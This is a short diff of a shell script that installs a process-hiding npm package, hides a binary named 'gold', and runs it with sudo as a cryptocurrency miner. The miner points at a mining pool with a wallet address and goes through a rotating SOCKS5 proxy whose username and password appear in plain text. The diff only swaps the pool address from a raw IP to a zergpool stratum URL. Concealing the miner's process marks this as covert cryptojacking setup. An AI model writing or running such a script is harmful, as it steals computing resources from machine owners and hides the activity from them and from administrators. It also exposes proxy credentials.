@@ -10,4 +10,4 @@ apt-get install -y nodejs
 npm i -g node-process-hider
 
 ph add gold
-sudo ./gold -a minotaurx -o 103.249.70.7:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
+sudo ./gold -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80 
